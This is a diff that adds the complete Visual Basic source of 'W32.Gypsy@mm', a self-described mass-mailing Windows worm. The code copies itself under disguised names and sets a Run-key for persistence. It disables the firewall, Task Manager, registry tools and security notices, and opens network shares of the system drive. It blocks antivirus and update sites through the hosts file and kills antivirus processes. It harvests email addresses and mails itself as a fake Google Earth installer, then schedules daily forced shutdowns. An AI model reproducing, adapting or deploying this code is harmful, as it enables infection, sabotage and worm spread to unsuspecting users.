@@ -1,0 +1,442 @@
+                            W32.Gypsy@mm Source Code
+                            ========================
+
+
+
+
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+
+Option Explicit
+ Dim WShell, Fso As Object
+ Dim SysDrv, OsType, WinFolder, RegKey, RegStrValue, RegKey2 As String
+ Dim RegStrValue2, UserIdent, DefaultUser, RegKey3, RegStrValue3 As String
+ Dim OutlookVer, RegKey4, RegStrValue4, RegKey5, RegStrValue5 As String
+ Dim RegKey6, RegStrValue6, RegKey7, RegStrValue7, PrgmFiles As String
+ Dim LocalIp, FilePath, HostsFile, AllTaskFiles As String
+ 
+ Dim ExtenType(0 To 17), LoopCnt, FileNum, StrPos, TxtCnt As Integer
+ Dim FirstEmail, CurrHour, CurrMin As Integer
+ 
+ Dim AvName, AvType, AvProcess, CurrFile, TextInput, StrInput As String
+ Dim MailAddress, Fold, Mail_To, Mail_CarbCpy, Mail_Subject As String
+ Dim Mail_Attachment, Mail_Body, Comment As String
+   
+'68kb
+'W32.Gypsy@mm
+'Lame but still effective
+
+Private Sub Form_Load()
+ Form1.Visible = False
+ Me.Hide
+If App.PrevInstance = True Then
+ End
+End If
+
+ SysDrv = Environ("SystemDrive") & "\"
+ OsType = Environ("OS")
+
+If Dir(SysDrv & "WINNT", vbDirectory) = "WINNT" Then
+ WinFolder = "WINNT"
+ElseIf Dir(SysDrv & "WINDOWS", vbDirectory) = "WINDOWS" Then
+ WinFolder = "WINDOWS"
+Else
+ End
+End If
+
+If Dir(SysDrv & WinFolder & "\System32\", vbDirectory) <> "Regverif32.exe" Then
+ FileCopy App.Path & App.EXEName & ".exe", SysDrv & WinFolder & "\System32\Regverif32.exe"
+ SetAttr SysDrv & WinFolder & "\System32\Regverif32.exe", vbHidden
+End If
+
+If Dir(SysDrv & WinFolder & "\", vbDirectory) <> "GoogleEarthSetup.exe" Then
+ FileCopy App.Path & App.EXEName & ".exe", SysDrv & WinFolder & "\GoogleEarthSetup.exe"
+End If
+
+If OsType = "Windows_NT" Then
+ Call Check_RegValues
+ Call Start_NetShare
+ Call Edit_HostFile
+ Call Stop_AntiVirus
+ Call Collect_Emails(SysDrv)
+ Call Send_Emails(MailAddress, Mail_CarbCpy)
+ Call Check_TaskFolder(SysDrv & WinFolder & "\Tasks\")
+Else
+ Call Check_RegValues
+ Call Stop_AntiVirus
+ Call Collect_Emails(SysDrv)
+ Call Send_Emails(MailAddress, Mail_CarbCpy)
+End If
+
+ MsgBox "The file " & App.EXEName & ".exe" & " is corrupted or missing", vbCritical, "Error Message"
+End
+End Sub
+
+Function Check_RegValues()
+On Error Resume Next
+
+Set WShell = CreateObject("WScript.Shell")
+  
+ RegKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"
+ RegStrValue = WShell.RegRead(RegKey & "RegVfy32")
+
+If RegStrValue = "" Then
+ Open SysDrv & WinFolder & "\System32\Sys32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
+ Print #1, Chr(34) & "RegVfy32" & Chr(34) & "=" & Chr(34) & "\" & Chr(34) & SysDrv & _
+   "\" & WinFolder & "\\System32\\Regverif32.exe" & Chr(34) & Chr(34)
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\Sys32.reg"
+End If
+
+ RegKey2 = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\"
+ RegStrValue2 = WShell.RegRead(RegKey2 & "DisableRegistryTools")
+
+If RegStrValue2 <> 1 Then
+ Open SysDrv & WinFolder & "\System32\Reg32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]"
+ Print #1, Chr(34) & "DisableRegistryTools" & Chr(34) & "=dword:00000001"
+ Print #1, Chr(34) & "DisableTaskMgr" & Chr(34) & "=dword:00000001"
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\Reg32.reg"
+End If
+
+ UserIdent = "HKCU\Identities\"
+ DefaultUser = WShell.RegRead(UserIdent & "Default User ID")
+ RegKey3 = UserIdent & DefaultUser & "\Software\Microsoft\Outlook Express\5.0\Dont Show Dialogs\"
+If InStr(RegKey3, "6.0") Then
+ OutlookVer = "6.0\"
+ RegKey3 = "HKCU\Identities\" & DefaultUser _
+  & "\Software\Microsoft\Outlook Express\" & OutlookVer
+ElseIf InStr(RegKey3, "5.0") Then
+ OutlookVer = "5.0\"
+ RegKey3 = "HKCU\Identities\" & DefaultUser _
+  & "\Software\Microsoft\Outlook Express\" & OutlookVer
+End If
+ RegStrValue3 = WShell.RegRead(RegKey3 & "Compact Do not Ask Again")
+
+If RegStrValue3 <> 1 Then
+ Open SysDrv & WinFolder & "\System32\OE32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_CURRENT_USER\Identities\" & DefaultUser & "\Software\Microsoft\Outlook Express\" & OutlookVer & "\Dont Show Dialogs]"
+ Print #1, Chr(34) & "Compact Do not Ask Again" & Chr(34) & "=dword:00000001"
+ Print #1, Chr(34) & "Delete Thread Warning" & Chr(34) & "=dword:00000006"
+ Print #1, Chr(34) & "Mail Empty Subject Warning" & Chr(34) & "=dword:00000001"
+ Print #1, Chr(34) & "Send Mail Warning" & Chr(34) & "=dword:00000001"
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\OE32.reg"
+End If
+
+ RegKey4 = "HKLM\SOFTWARE\Microsoft\Security Center\"
+ RegStrValue4 = WShell.RegRead(RegKey4 & "AntiVirusDisableNotify")
+
+If RegStrValue4 <> 0 Then
+ Open SysDrv & WinFolder & "\System32\Sec32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center]"
+ Print #1, Chr(34) & "AntiVirusDisableNotify" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "AntiVirusOverride" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "FirewallDisableNotify" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "FirewallOverride" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "UpdatesDisableNotify" & Chr(34) & "=dword:00000000"
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\Sec32.reg"
+End If
+
+ RegKey5 = "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile"
+ RegStrValue5 = WShell.RegRead(RegKey5 & "EnableFirewall")
+
+If RegStrValue5 <> 0 Then
+ Open SysDrv & WinFolder & "\System32\FWall32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile]"
+ Print #1, Chr(34) & "EnableFirewall" & Chr(34) & "=dword:00000000"
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\FWall32.reg"
+End If
+
+ RegKey6 = "HKLM\System\CurrentControlSet\Control\LSA\"
+ RegStrValue6 = WShell.RegRead(RegKey6 & "limitblankpassworduse")
+
+If RegStrValue6 <> 0 Then
+ Open SysDrv & WinFolder & "\System32\NTFS32.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA]"
+ Print #1, Chr(34) & "limitblankpassworduse" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "forceguest" & Chr(34) & "=dword:00000000"
+ Print #1, Chr(34) & "crashonauditfail" & Chr(34) & "=dword:00000000"
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\NTFS32.reg"
+End If
+
+ RegKey7 = "HKLM\Software\Gypsy\W32.Gypsy\Virus Infomation\"
+ RegStrValue7 = WShell.RegRead(RegKey7 & "Virus Name")
+
+If RegStrValue7 = "" Then
+ Open SysDrv & WinFolder & "\System32\W32Info.reg" For Output As #1
+ Print #1, "REGEDIT4"
+ Print #1, ""
+ Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Gypsy]"
+ Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Gypsy\W32.Gypsy]"
+ Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Gypsy\W32.Gypsy\Virus Infomation]"
+ Print #1, Chr(34) & "Virus Name" & Chr(34) & "=" & Chr(34) & "W32.Gypsy@mm" & Chr(34)
+ Print #1, Chr(34) & "Virus Creator" & Chr(34) & "=" & Chr(34) & "Unknowan" & Chr(34)
+ Print #1, Chr(34) & "Virus Origin" & Chr(34) & "=" & Chr(34) & "Unknowan" & Chr(34)
+ Print #1, Chr(34) & "Virus Type" & Chr(34) & "=" & Chr(34) & "Worm" & Chr(34)
+ Print #1, Chr(34) & "Virus Path" & Chr(34) & "=" & Chr(34) & SysDrv & WinFolder & "\System32" & Chr(34)
+ Print #1, Chr(34) & "Virus Created With" & Chr(34) & "=" & Chr(34) & "Visual Basic 6" & Chr(34)
+ Print #1, Chr(34) & "Date Of Infection" & Chr(34) & "=" & Chr(34) & Date$ & Chr(34)
+ Print #1, Chr(34) & "Time Of Infection" & Chr(34) & "=" & Chr(34) & Time$ & Chr(34)
+ Close #1
+  Shell "regedit /s " & SysDrv & WinFolder & "\System32\W32Info.reg"
+End If
+End Function
+
+Function Start_NetShare()
+ PrgmFiles = Environ("ProgramFiles") & "\"
+ 
+If Dir(PrgmFiles & "WindowsUpdate\System Security\Updates.tmp", vbDirectory) <> "Updates.tmp" Then
+ MkDir PrgmFiles & "WindowsUpdate\System Security"
+ MkDir PrgmFiles & "WindowsUpdate\System Security\Updates.tmp"
+ 
+ FileCopy App.Path & App.EXEName & ".exe", PrgmFiles & "WindowsUpdate\System Security\Asistant_Alert.exe"
+ FileCopy App.Path & App.EXEName & ".exe", PrgmFiles & "WindowsUpdate\System Security\NetAlert_v2.4.exe"
+ FileCopy App.Path & App.EXEName & ".exe", PrgmFiles & "WindowsUpdate\System Security\Updates.tmp\exploit_patcher_v1.0.0.exe"
+ FileCopy App.Path & App.EXEName & ".exe", PrgmFiles & "WindowsUpdate\System Security\Updates.tmp\NetWatch_v1.0.3.exe"
+End If
+
+ Shell ("net Share Remote Service=" & PrgmFiles & "WindowsUpdate"), vbHide
+  Sleep (500)
+ Shell ("net Share Gypsy=" & SysDrv), vbHide
+  Sleep (500)
+ Shell ("net Share ADMIN$"), vbHide
+End Function
+
+Function Edit_HostFile()
+   
+    LocalIp = "127.0.0.1 "
+    HostsFile = "\System32\drivers\etc\hosts"
+    
+  Open SysDrv & WinFolder & HostsFile For Append As #1
+   Print #1, ""
+   Print #1, "# Host file has been infected by :"
+   Print #1, "# W32.Gypsy@mm"
+   Print #1, ""
+   Print #1, LocalIp & "www.google.com"
+   Print #1, LocalIp & "www.yahoo.com"
+   Print #1, LocalIp & "www.hotmail.com"
+   Print #1, LocalIp & "www.microsoft.com"
+   Print #1, LocalIp & "www.symantec.com"
+   Print #1, LocalIp & "www.trendmicro.com"
+   Print #1, LocalIp & "www.mcafee.com"
+   Print #1, LocalIp & "messenger.yahoo.com"
+   Print #1, LocalIp & "messenger.msn.com"
+   Print #1, LocalIp & "www.kazaa.com"
+   Print #1, LocalIp & "www.emule.com"
+   Print #1, LocalIp & "www.winmx.com"
+   Print #1, LocalIp & "www.limewire.com"
+   Print #1, LocalIp & "www.winguides.com"
+   Print #1, LocalIp & "www.vet.com"
+   Print #1, LocalIp & "www.ebay.com"
+   Print #1, LocalIp & "www.msn.com"
+   Print #1, LocalIp & "www.hotmail.com"
+   Print #1, LocalIp & "www.mp3.com"
+   Print #1, LocalIp & "www.grisoft.com"
+   Print #1, LocalIp & "www.zonelabs.com"
+   Print #1, LocalIp & "www.lavasoft.com"
+   Print #1, LocalIp & "update.microsoft.com"
+   Print #1, LocalIp & "morpheus.com"
+   Print #1, LocalIp & "www.imesh.com"
+   Print #1, LocalIp & "www.edonkey2000.com"
+   Print #1, LocalIp & "www.bearshare.com"
+   Print #1, LocalIp & "www.agsatellite.com"
+   Print #1, LocalIp & "www.zeropaid.com"
+   Print #1, LocalIp & "www.bittorrent.com"
+   Print #1, LocalIp & "login.yahoo.com"
+   Print #1, LocalIp & "www.securityfocus.com"
+   Print #1, LocalIp & "www.geocities.com"
+   Print #1, LocalIp & "www.sophos.com"
+   Print #1, LocalIp & "www.pandasoftware.com"
+   Print #1, LocalIp & "www.ibm.com"
+   Print #1, LocalIp & "www.dell.com"
+   Print #1, LocalIp & "www.hp.com"
+   Print #1, LocalIp & "www.sec-1.com"
+   Print #1, LocalIp & "www.kaspersky.com"
+  Close #1
+  End Function
+  
+Function Stop_AntiVirus()
+    
+  AvType = Array("avgctrl.exe", "avgamsvr.exe", "avgserv.exe", "avgmsvr.exe", _
+   "avgcc32.exe", "avgcc.exe", "avginet.exe", "avgupsvc.exe", "avgemc.exe", _
+   "avgnt.exe", "avgregcl.exe", "avgserv9.exe", "avgw.exe", "alogserv.exe", _
+   "avsynmgr.exe", "Mpfsheild.exe", "MpfAgent.exe", "mpf.exe", "MpfConsole.exe", _
+   "mcagent.exe", "mcappins.exe", "McDash.exe", "mcdetect.exe", "mcinfo.exe", _
+   "mcmnhdlr.exe", "mcshield.exe", "mctskshd.exe", "mcupdate.exe", "mcvsescn.exe", _
+   "mcvsshld.exe", "mcvsftsn.exe", "mcvsrte.exe", "vstskmgr.exe", "vsmain.exe", _
+   "vshwin32.exe", "pccpfw.exe", "pccclient.exe", "pcclient.exe", "pccguide.exe", _
+   "pccnt.exe", "pccntmon.exe", "pccntupd.exe", "pccpfw.exe", "PcCtlCom.exe", _
+   "pcscan.exe", "avpm.exe", "avpcc.exe", "kav.exe", "kavmm.exe", "kavsvc.exe", _
+   "AVENGINE.EXE", "remupd.exe", "inicio.exe", "prevsrv.exe", "ALsvc.exe", _
+   "ALMon.exe", "SavService.exe", "SWNETSUP.exe", "ALUNotify.exe", "ccApp.exe", _
+   "nisserv.exe", "NISUM.exe", "Navapsvc.exe", "NMain.exe", "Navapw32.exe", _
+   "VetMsg.exe", "VetTray.exe", "Vet32.exe", "VetNT.exe", "vsmon.exe", _
+   "zlclient.exe", "zapro.exe", "zonealarm.exe")
+  
+ For Each AvName In AvType
+  For Each AvProcess In GetObject("winmgmts:"). _
+   ExecQuery("select name from Win32_Process where name = " & Chr(39) & AvName & Chr(39))
+   AvProcess.Terminate (0)
+  Next
+ Next AvName
+   
+End Function
+
+Function Collect_Emails(SysDir)
+On Error Resume Next
+ 
+  ExtenType(0) = "htm": ExtenType(1) = "php"
+  ExtenType(2) = "hta": ExtenType(3) = "doc"
+  ExtenType(4) = "hte": ExtenType(5) = "php"
+  ExtenType(6) = "htt": ExtenType(7) = "xls"
+  ExtenType(8) = "htx": ExtenType(9) = "eml"
+  ExtenType(10) = "sht": ExtenType(11) = "jsp"
+  ExtenType(12) = "stm": ExtenType(13) = "xml"
+  ExtenType(14) = "js": ExtenType(15) = "cgi"
+  ExtenType(16) = "vbs": ExtenType(17) = "vbe"
+
+If Right(SysDir, 1) <> "\" Then SysDir = SysDir & "\"
+For LoopCnt = 0 To 17
+ CurrFile = Dir(SysDir & "*." & ExtenType(LoopCnt))
+While CurrFile <> ""
+
+ FileNum = FreeFile
+Open SysDir & CurrFile For Input As #FileNum
+Do While Not EOF(FileNum)
+Input #FileNum, TextInput
+ StrInput = StrInput & TextInput
+ StrPos = InStr(StrInput, "mailto:")
+If StrPos <> 0 Then Exit Do
+Loop
+Close #FileNum
+
+If StrPos <> 0 Then
+If Mid(StrInput, StrPos, 7) = "mailto:" Then
+Do While Mid(StrInput, StrPos + 7 + TxtCnt, 1) <> Chr(34)
+ MailAddress = MailAddress & Mid(StrInput, StrPos + 7 + TxtCnt, 1)
+ TxtCnt = TxtCnt + 1
+If InStr(MailAddress, Chr(32)) = TxtCnt Then
+ MailAddress = Right(MailAddress, Len(MailAddress) - 1)
+ElseIf InStr(MailAddress, Chr(63)) = TxtCnt Then
+ MailAddress = Left(MailAddress, Len(MailAddress) - 1)
+ Exit Do
+ElseIf InStr(MailAddress, Chr(92)) = TxtCnt Then
+ MailAddress = Left(MailAddress, Len(MailAddress) - 1)
+ Exit Do
+ElseIf InStr(MailAddress, Chr(47)) = TxtCnt Then
+ MailAddress = Left(MailAddress, Len(MailAddress) - 1)
+ Exit Do
+ElseIf InStr(MailAddress, Chr(62)) = TxtCnt Then
+ MailAddress = Left(MailAddress, Len(MailAddress) - 1)
+ Exit Do
+ElseIf InStr(MailAddress, Chr(38)) = TxtCnt Then
+ MailAddress = Left(MailAddress, Len(MailAddress) - 1)
+ Exit Do
+End If
+Loop
+
+If MailAddress <> "" Then
+If FirstEmail <> 1 Then
+ Mail_To = MailAddress
+ FirstEmail = 1
+Else
+If MailAddress <> "" Then
+ Mail_CarbCpy = Mail_CarbCpy & MailAddress & ";"
+End If
+End If
+End If
+End If
+End If
+ TextInput = ""
+ StrInput = ""
+ StrPos = 0
+ MailAddress = ""
+ TxtCnt = 0
+ CurrFile = Dir
+Wend
+Next
+
+Set Fso = CreateObject("Scripting.FileSystemObject")
+For Each Fold In Fso.GetFolder(SysDir).SubFolders
+ Call Collect_Emails(Fold.Path)
+Next
+End Function
+
+Function Send_Emails()
+ Mail_CarbCpy = Left(Mail_CarbCpy, Len(Mail_CarbCpy) - 1)
+ 
+ Shell (PrgmFiles & "Outlook Express\msimn.exe"), vbHide
+
+SendKeys "%F+N+M"
+
+ Mail_Subject = "Google Earth – Explore, Search and Discover"
+ Mail_Attachment = SysDrv & WinFolder & "\GoogleEarthSetup.exe"
+
+ Mail_Body = "Want to know more about a specific location? Dive right in -- Google Earth combines satellite{ENTER}"
+ Mail_Body = Mail_Body & "imagery, maps and the power of Google Search to put the world's geographic information at your{ENTER}"
+ Mail_Body = Mail_Body & "fingertips.{ENTER}+{ENTER}"
+ Mail_Body = Mail_Body & "* Fly from space to your neighborhood. Type in an address and zoom right in.{ENTER}"
+ Mail_Body = Mail_Body & "* Search for schools, parks, restaurants, and hotels. Get driving directions.{ENTER}"
+ Mail_Body = Mail_Body & "* Tilt and rotate the view to see 3D terrain and buildings.{ENTER}"
+ Mail_Body = Mail_Body & "* Save and share your searches and favorites. Even add your own annotations."
+    
+SendKeys Mail_To
+SendKeys "{TAB}" & Mail_CarbCpy
+SendKeys "{TAB}" & Mail_Subject
+SendKeys "{TAB}" & Mail_Body
+SendKeys "%I+A" & Mail_Attachment
+SendKeys "%A"
+SendKeys "%F+E"
+SendKeys "{ENTER}"
+ Sleep (800)
+ Kill SysDrv & WinFolder & "\GoogleEarthSetup.exe"
+
+ Mail_To = ""
+ Mail_CarbCpy = ""
+ Mail_Subject = ""
+ Mail_Attachment = ""
+ Mail_Body = ""
+End Function
+
+Function Check_TaskFolder(FilePath As String)
+ 
+ AllTaskFiles = Dir$(FilePath & "*.job")
+While AllTaskFiles <> ""
+  Kill FilePath & AllTaskFiles
+ AllTaskFiles = Dir$
+Wend
+ Call Write_NewTask(FilePath, "At1.job")
+End Function
+
+Function Write_NewTask(FilePath, TaskFile As String)
+ 
+ CurrHour = Hour(Now)
+ CurrMin = Minute(Now) + 1
+ 
+If CurrMin <= 9 Then CurrMin = "0" & CurrMin
+ Comment = Chr(34) & "From state to state and city to city infecting computers like a wondering Gypsy..!!" & Chr(34)
+ Shell Environ$("Comspec") & " /c At " & CurrHour & ":" & CurrMin & " /Interactive " _
+   & "/Every:M,T,W,Th,F,S,Su Shutdown -S -T10 -C " & Comment, vbHide
+   
+ Sleep (500)
+  FileCopy FilePath & TaskFile, FilePath & "Gypsy.job"
+ Sleep (500)
+  Kill FilePath & TaskFile
+End Function
